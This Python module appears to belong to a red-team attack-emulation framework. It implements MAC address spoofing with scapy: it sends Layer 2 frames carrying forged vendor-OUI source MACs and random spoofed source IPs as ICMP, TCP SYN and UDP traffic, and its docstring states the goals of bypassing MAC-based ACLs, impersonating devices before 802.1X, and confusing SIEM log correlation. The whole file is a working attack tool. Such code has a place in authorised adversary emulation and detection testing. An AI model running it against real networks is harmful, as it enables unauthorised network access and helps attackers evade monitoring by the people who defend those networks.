"""
MAC Address Spoofing — T1036.005

Sends L2 frames with a spoofed source MAC, optionally using a specific vendor OUI
(Cisco, HP, Dell…). Use cases: bypass MAC-based ACLs, identity spoofing before
802.1X authentication, and confusing SIEM log correlation with false MAC-to-IP maps.
"""
import os
import random

from scapy.all import (ARP, ICMP, IP, TCP, UDP, Ether, PcapWriter,
                       RandIP, RandMAC, Raw, sendp, srp)

NAME = "mac"
DESCRIPTION = "MAC address spoofing with optional vendor OUI"
ATTCK_ID = "T1036.005"

_VENDOR_OUIS = {
    "cisco":     "00:00:0C",
    "hp":        "00:1B:21",
    "dell":      "00:1C:B3",
    "apple":     "00:03:93",
    "microsoft": "00:15:5D",
    "google":    "00:1A:11",
}


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info("START | technique=%s | iface=%s | spoofed=%s | vendor=%s | count=%d",
                ATTCK_ID, args.interface, args.spoofed_mac or "auto",
                args.vendor or "random", args.count)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--spoofed-mac",
                   help="Specific MAC to spoof (omit for random/vendor-based)")
    p.add_argument("--target-mac", "-tm", default="ff:ff:ff:ff:ff:ff")
    p.add_argument("--target-ip",  "-ti", default="192.168.1.1")
    p.add_argument("--vendor",
                   choices=list(_VENDOR_OUIS.keys()) + ["random"],
                   help="Vendor OUI for spoofed MAC (default: random)")
    p.add_argument("--count", "-c", type=int, default=100)
    p.add_argument("--pcap", nargs="?", const="default",
                   help="PCAP path (default: ~/RapidStrike/mac.pcap)")
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print

    spoofed_mac = args.spoofed_mac or _gen_mac(args.vendor)
    _log(f"[MAC] Spoofing as {spoofed_mac} → target {args.target_ip} ({args.target_mac})")

    pcap_writer = None
    if args.pcap:
        path = (args.pcap if args.pcap != "default"
                else os.path.expanduser("~/RapidStrike/mac.pcap"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        pcap_writer = PcapWriter(path, append=True, sync=True)

    pkts = _gen_packets(spoofed_mac, args.target_mac, args.count, args.target_ip)
    try:
        for i, pkt in enumerate(pkts):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if pcap_writer:
                pcap_writer.write(pkt)
            if (i + 1) % 10 == 0:
                _log(f"[MAC] {i+1}/{len(pkts)}")
        _log(f"[MAC] Sent {len(pkts)} spoofed frames")
        if pcap_writer:
            pcap_writer.close()
        return True
    except Exception as e:
        _log(f"[MAC] Error: {e}")
        if pcap_writer:
            pcap_writer.close()
        return False


def _gen_mac(vendor=None):
    if vendor and vendor in _VENDOR_OUIS:
        oui = _VENDOR_OUIS[vendor]
        nic = ":".join(f"{random.randint(0,255):02x}" for _ in range(3))
        return f"{oui}:{nic}"
    return str(RandMAC())


def _gen_packets(src_mac, dst_mac, count, target_ip):
    pkts = []
    for i in range(count):
        kind = random.choice(["icmp", "tcp", "udp"])
        if kind == "icmp":
            p = (Ether(src=src_mac, dst=dst_mac) /
                 IP(dst=target_ip, src=RandIP()) / ICMP())
        elif kind == "tcp":
            p = (Ether(src=src_mac, dst=dst_mac) /
                 IP(dst=target_ip, src=RandIP()) /
                 TCP(sport=random.randint(1024, 65535),
                     dport=random.choice([80, 443, 22, 25]), flags="S"))
        else:
            p = (Ether(src=src_mac, dst=dst_mac) /
                 IP(dst=target_ip, src=RandIP()) /
                 UDP(sport=random.randint(1024, 65535),
                     dport=random.choice([53, 67, 123, 161])))
        pkts.append(p)
    return pkts
